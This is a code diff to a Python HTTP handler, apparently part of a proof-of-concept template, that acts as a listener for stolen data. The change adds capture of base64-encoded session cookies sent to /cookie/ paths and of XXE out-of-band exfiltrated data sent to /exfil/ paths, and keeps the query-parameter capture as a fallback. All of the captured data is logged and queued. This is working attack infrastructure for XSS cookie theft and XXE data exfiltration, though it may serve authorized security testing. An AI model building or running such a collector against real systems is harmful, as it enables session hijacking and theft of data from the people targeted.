@@ -9,7 +9,7 @@ import logging
 from datetime import datetime
 import json
 import base64
-from urllib.parse import parse_qs, urlparse
+from urllib.parse import parse_qs, urlparse, unquote
 import os
 from queue import Queue
 from {{cookiecutter.project_slug}}.utils.network import get_interfaces
@@ -115,9 +115,12 @@ class POCHTTPHandler(SimpleHTTPRequestHandler):
         if body:
             out.debug(f"Body: {body.decode('utf-8', errors='replace')[:100]}")
 
-        # Check for interesting parameters and add to queue
-        if 'cookie' in query_params:
-            cookie_data = query_params['cookie'][0] if query_params['cookie'] else ''
+        # Check for path parameters first (e.g., /cookie/data or /exfil/data)
+        path = parsed.path
+
+        # Check for cookie in path
+        if path.startswith('/cookie/'):
+            cookie_data = unquote(path[8:])  # Remove '/cookie/' prefix and URL decode
             try:
                 decoded_cookie = base64.b64decode(cookie_data).decode('utf-8', errors='replace')
                 out.success(f"🍪 COOKIE CAPTURED: {decoded_cookie}")
@@ -126,11 +129,30 @@ class POCHTTPHandler(SimpleHTTPRequestHandler):
                 out.success(f"🍪 COOKIE (raw): {cookie_data}")
                 event_queue.put({'type': 'cookie', 'data': cookie_data, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})
 
-        # Check for XXE/exfil data
-        if 'exfil' in query_params:
-            exfil_data = query_params['exfil'][0] if query_params['exfil'] else ''
+        # Check for exfil in path
+        elif path.startswith('/exfil/'):
+            exfil_data = unquote(path[7:])  # Remove '/exfil/' prefix and URL decode
             out.success(f"📤 EXFIL DATA: {exfil_data[:200]}...")  # Show first 200 chars
             event_queue.put({'type': 'exfil', 'data': exfil_data, 'timestamp': datetime.now().isoformat()})
+
+        # Fall back to checking query parameters
+        else:
+            # Check for interesting parameters in query and add to queue
+            if 'cookie' in query_params:
+                cookie_data = query_params['cookie'][0] if query_params['cookie'] else ''
+                try:
+                    decoded_cookie = base64.b64decode(cookie_data).decode('utf-8', errors='replace')
+                    out.success(f"🍪 COOKIE CAPTURED: {decoded_cookie}")
+                    event_queue.put({'type': 'cookie', 'data': decoded_cookie, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})
+                except:
+                    out.success(f"🍪 COOKIE (raw): {cookie_data}")
+                    event_queue.put({'type': 'cookie', 'data': cookie_data, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})
+
+            # Check for XXE/exfil data
+            if 'exfil' in query_params:
+                exfil_data = query_params['exfil'][0] if query_params['exfil'] else ''
+                out.success(f"📤 EXFIL DATA: {exfil_data[:200]}...")  # Show first 200 chars
+                event_queue.put({'type': 'exfil', 'data': exfil_data, 'timestamp': datetime.now().isoformat()})
 
     def log_message(self, format, *args):
         # Suppress default logging
